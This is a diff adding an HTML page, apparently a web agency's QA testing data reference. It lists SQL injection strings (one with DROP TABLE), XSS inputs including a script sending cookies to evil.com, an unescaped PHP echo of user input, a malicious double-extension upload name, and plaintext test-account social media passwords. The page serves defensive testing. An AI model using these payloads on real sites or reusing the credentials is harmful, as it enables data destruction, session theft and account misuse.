@@ -1,0 +1,236 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="intersmart">
+    <title>Intersmart QA Testing Data Repository</title>
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --background-light: #f4f7f6;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--primary-color);
+            background-color: var(--background-light);
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+            background: white;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 3px solid var(--secondary-color);
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        .logo img {
+            height: 50px;
+            margin-right: 15px;
+        }
+        .logo-text {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: var(--primary-color);
+        }
+        .data-section {
+            background-color: #f9f9f9;
+            border-left: 5px solid var(--secondary-color);
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+        h2 {
+            color: var(--secondary-color);
+            border-bottom: 2px solid var(--secondary-color);
+            padding-bottom: 5px;
+            margin-bottom: 10px;
+        }
+        pre {
+            background-color: #f1f1f1;
+            border-radius: 4px;
+            padding: 10px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .warning {
+            color: red;
+            font-weight: bold;
+        }
+        .footer {
+            text-align: center;
+            padding: 15px;
+            background-color: var(--primary-color);
+            color: white;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj4KICA8Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI0NSIgZmlsbD0iIzNhOTRkZCIvPgogIDxyZWN0IHg9IjMwIiB5PSIzMCIgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiBmaWxsPSJ3aGl0ZSIvPgogIDxjaXJjbGUgY3g9IjUwIiBjeT0iNTAiIHI9IjIwIiBmaWxsPSIjMmM2ZWJkIi8+Cjwvc3ZnPg==" alt="Intersmart Logo">
+                <span class="logo-text">Intersmart QA Testing Repository</span>
+            </div>
+        </div>
+
+        <div class="data-section">
+            <h2>🔒 SQL Injection Test Payloads</h2>
+            <pre>
+# Login Page Injection Attempts
+Name: ' OR '1'='1'; --
+Email: test@test.com
+Message: This is a test message.
+
+# Additional Injection Payloads
+OR 1=1; DROP TABLE table_name; --
+Coupon code: "'or 1=1--"</pre>
+        </div>
+
+        <div class="data-section">
+            <h2>🌐 Cross-Site Scripting (XSS) Test Inputs</h2>
+            <pre>
+# Standard XSS Scripts
+&lt;script&gt;alert('XSS');&lt;/script&gt;
+&lt;body onload=alert("XSS")&gt;
+&lt;input type="image" src="javascript:alert('XSS');"&gt;
+
+# Advanced XSS Payload
+&lt;script&gt;
+window.location="http://evil.com/?cookie=" + document.cookie
+&lt;/script&gt;
+
+# HTML Injection Examples
+Name: &lt;h1&gt;Test Name&lt;/h1&gt;
+Email: test@test.com
+Message: hello . please&lt;9009e0&gt;
+
+# Reflected XSS Example
+&lt;!-- Vulnerable HTML --&gt;
+&lt;form action="/search"&gt;
+&lt;input type="text" name="query" value="&lt;?php echo $_GET['query']; ?&gt;"&gt;
+&lt;input type="submit" value="Search"&gt;
+&lt;/form&gt;</pre>
+        </div>
+
+        <div class="data-section">
+            <h2>📝 Form Validation Test Data</h2>
+            <pre>
+# Valid Form Submissions
+Name: John Doe
+Email: john.doe@example.com
+Message: Hello, I'm interested in your services.
+
+Name: Jane Smith
+Email: jane.smith@gmail.com
+Message: This is a test message for the contact form.
+
+# Invalid Form Submissions
+Name: (empty)
+Email: john.doe@example.com
+Message: Hello, I'm interested in your services.
+
+Name: John Doe
+Email: (invalid email format)
+Message: This is a test message for the contact form.
+
+Name: John Doe
+Email: john.doe@example.com
+Message: (empty)</pre>
+        </div>
+
+        <div class="data-section">
+            <h2>📤 File Upload Vulnerability Test</h2>
+            <pre>
+# Test Malicious File Upload
+Upload file with double extension: 
+maliciousfile.php.jpg
+
+Verification Checks:
+- Validate file types
+- Prevent executable file uploads
+- Check for file size limits
+- Scan for potential malicious content</pre>
+        </div>
+
+        <div class="data-section">
+            <h2>🌍 Geolocation and Embedding Test</h2>
+            <pre>
+# Sample Google Maps iFrame Embed
+&lt;div style="width: 100%"&gt;
+&lt;iframe width="100%" height="600" 
+src="https://maps.google.com/maps?width=100%25&height=600&hl=en&q=1%20Grafton%20Street,%20Dublin,%20Ireland"&gt;
+&lt;/iframe&gt;
+&lt;/div&gt;</pre>
+        </div>
+
+        <div class="data-section">
+            <h2>🔐 Social Media Test Credentials</h2>
+            <pre class="warning">
+# WARNING: Use Only for Testing Purposes
+Facebook:
+user: abhiramissqa@gmail.com
+pwd: Abhihere12
+
+Instagram:
+user: abhiramissqa@gmail.com
+pwd: Abhihere12
+
+Twitter (Google Login):
+user: abhiramissqa@gmail.com
+pwd: aBHIHERE12@</pre>
+        </div>
+
+        <div class="data-section">
+            <h2>📍 Sample Address</h2>
+            <pre>
+John Doe
+1234 Elm Street
+Springfield, IL 62704
+United States
+
+Phone: (555) 123-4567
+Email: john.doe@example.com</pre>
+        </div>
+
+        <div class="data-section">
+            <h2>🔗 QA Testing Resources</h2>
+            <pre>
+# File Sample Repositories
+https://filesamples.com/
+https://sampletestfiles.com/
+
+# Performance Testing Tools
+sitespeed.io https://www.sitespeed.io/ -b chrome
+
+# Utility Tools
+- Minify CSS: https://dailyocr.com/tools/minified-css-checker
+- Robots.txt Checker: https://technicalsea.com/tools/robots-txt/
+
+# Additional Meta Tags
+&lt;meta name="TEST other meta tag" content="intersmart"&gt;</pre>
+        </div>
+    </div>
+
+    <div class="footer">
+        Created by Abhiram, Lead QA Analyst, Intersmart Technology
+    </div>
+</body>
+</html>
